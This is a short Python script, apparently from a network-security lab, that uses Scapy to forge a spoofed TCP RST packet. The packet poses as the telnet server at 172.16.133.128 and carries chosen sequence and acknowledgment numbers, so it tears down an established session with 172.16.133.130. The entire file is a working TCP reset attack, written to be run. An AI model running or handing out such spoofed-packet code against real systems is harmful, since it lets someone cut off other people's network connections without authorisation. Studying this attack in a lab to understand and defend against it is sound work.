#!/usr/bin/python3
from scapy.all import *
ip = IP(src="172.16.133.128", dst="172.16.133.130")
tcp = TCP(sport=23, dport=55488, flags="R", seq=2489810358,
ack=2007618214)
pkt = ip / tcp
#ls(pkt)
send(pkt, verbose=0)